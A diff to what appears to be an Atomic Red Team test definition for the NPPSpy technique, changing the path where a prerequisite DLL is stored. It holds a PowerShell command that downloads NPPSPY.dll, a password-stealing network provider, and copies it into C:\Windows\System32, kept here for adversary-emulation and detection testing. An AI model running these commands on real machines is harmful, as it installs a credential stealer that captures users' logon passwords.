@@ -59,10 +59,11 @@ atomic_tests:
   dependency_executor_name: powershell
   dependencies:
   - description: NPPSpy.dll must be available in ExternalPayloads directory
-    prereq_command: if (Test-Path "PathToAtomicsFolder\ExternalPayloads\NPPSPY.dll") {exit 0} else {exit 1}
+    prereq_command: if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\NPPSPY.dll") {exit 0} else {exit 1}
     get_prereq_command: |-
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-      Invoke-WebRequest -Uri https://github.com/gtworek/PSBits/raw/f221a6db08cb3b52d5f8a2a210692ea8912501bf/PasswordStealing/NPPSpy/NPPSPY.dll -OutFile "PathToAtomicsFolder\ExternalPayloads\NPPSPY.dll"
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest -Uri https://github.com/gtworek/PSBits/raw/f221a6db08cb3b52d5f8a2a210692ea8912501bf/PasswordStealing/NPPSpy/NPPSPY.dll -OutFile "PathToAtomicsFolder\..\ExternalPayloads\NPPSPY.dll"
   executor:
     command: |-
       Copy-Item "PathToAtomicsFolder\ExternalPayloads\NPPSPY.dll" -Destination "C:\Windows\System32"
